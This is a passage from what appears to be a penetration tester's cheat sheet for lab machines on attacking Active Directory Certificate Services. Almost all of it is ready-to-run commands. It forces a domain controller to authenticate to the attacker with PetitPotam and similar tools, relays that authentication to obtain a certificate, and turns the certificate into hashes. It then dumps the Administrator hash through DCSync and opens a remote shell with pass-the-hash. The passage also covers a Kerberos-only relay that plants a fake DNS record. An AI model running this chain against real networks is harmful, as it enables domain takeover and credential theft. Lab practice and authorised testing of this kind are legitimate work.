certipy relay -target 'http://<CA>/certsrv/certfnsh.asp' -template DomainController
```

**Terminal 2 — coerce the DC to authenticate to YOU:**

```bash
nxc smb <DC-IP> -u <user> -p '<pass>' -d <DOMAIN> -M coerce_plus -o LISTENER=<ME>
```

or standalone PetitPotam (`<your-ip> <dc-ip>`):

```bash
python3 PetitPotam.py -d <DOMAIN> -u <user> -p '<pass>' <ME> <DC-IP>
```

→ certipy relays the DC's NTLM, requests the cert, saves **`<DC>.pfx`**.

**Then — cert → Administrator → root:**

```bash
certipy auth -pfx <DC>.pfx -dc-ip <DC-IP>
export KRB5CCNAME=<dc>.ccache
impacket-secretsdump -k -no-pass -just-dc-user Administrator <DOMAIN>/'<DC>$'@<CA>
impacket-psexec -hashes :<ADMIN_NT_HASH> -k <DOMAIN>/Administrator@<CA> -dc-ip <DC-IP>
```



#### 2. **NTLM off (Kerberos-only, like VulnCicada):** 

Fake-DNS (CredMarshalTargetInfo) + **krbrelayx** + coerce. `certipy relay` may just time out → go manual (see Phase 8).

**The marshaled fake-DNS name is PER-BOX — regenerate it, don't just swap the hostname.** 

The gibberish tail (`1UWhRC…`) _encodes the target's own name_, so it changes when the DC name changes.

- **Try `certipy relay` FIRST** — newer certipy often handles the marshaling for you. Only go manual (krbrelayx + marshaled DNS) when it times out (like VulnCicada did).
- To generate the name for a new box, use the **script published in the [synacktiv article](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html)** (it builds `<host>` + a marshaled `CredMarshalTargetInfo` blob). ⚠️ **Copy it from the article exactly — the bytes must be perfect, a wrong tail silently fails**, so don't hand-type or reuse another box's string. Then: `bloodyAD ... add dnsRecord "<generated-name>" <your-ip>` → `dig @<dc-ip> <generated-name>.<domain> A` to verify it points to you.

**krbrelayx `Address already in use` (port 80 / 53):**

- **Port 53** = your own `systemd-resolved` (binds `127.0.0.53`). **Port 80** = often a `python3 -m http.server` you left running.
- **Fix:** bind krbrelayx to your VPN interface only → **`--interface-ip <tun0-ip>`** (dodges systemd-resolved). Free 80: `sudo ss -tlnp | grep ':80'` → kill the PID.
- **Harmless if SMB started:** for an **SMB-coercion → ADCS** relay you only need the **SMB server (445)**. If you see `Servers started, waiting for connections`, the 80/53 errors don't matter — go coerce.

## Coercion toolbox (force a victim — usually the DC — to authenticate to you)

Try them in order; different ones are patched/enabled on different boxes:

- `nxc ... -M coerce_plus` (NetExec — tries several automatically) ← easiest
- **PetitPotam** (MS-EFSRPC) · **DFSCoerce** (MS-DFSNM) · **Coercer** (all-in-one) · **PrinterBug/SpoolSample** (MS-RPRN spooler)

## After you hold a certificate

```bash
certipy auth -pfx <file>.pfx -dc-ip <ip>       # cert → TGT + NT hash (PKINIT)

# machine/DC account? it can DCSync:
impacket-secretsdump -k -no-pass -just-dc-user Administrator dom/'<acct>$'@<dc-fqdn>

# then PtH:
impacket-psexec -hashes :<nt> -k dom/Administrator@<dc-fqdn> -dc-ip <ip>
```

## Golden reminders

- **Kerberos-only domain** (`NTLM:False`): `getTGT` → `export KRB5CCNAME` → every tool with `-k -no-pass`, **FQDN not IP**, include the **domain**, `-dc-ip` for the KDC's address.
- **`certipy find` names the ESC for you** — don't guess; read its output, then use the row above.
- **Targeting the DC machine account** (via ESC8/relay) is the strongest outcome: DC$ can **DCSync** → everyone's hashes → Administrator.
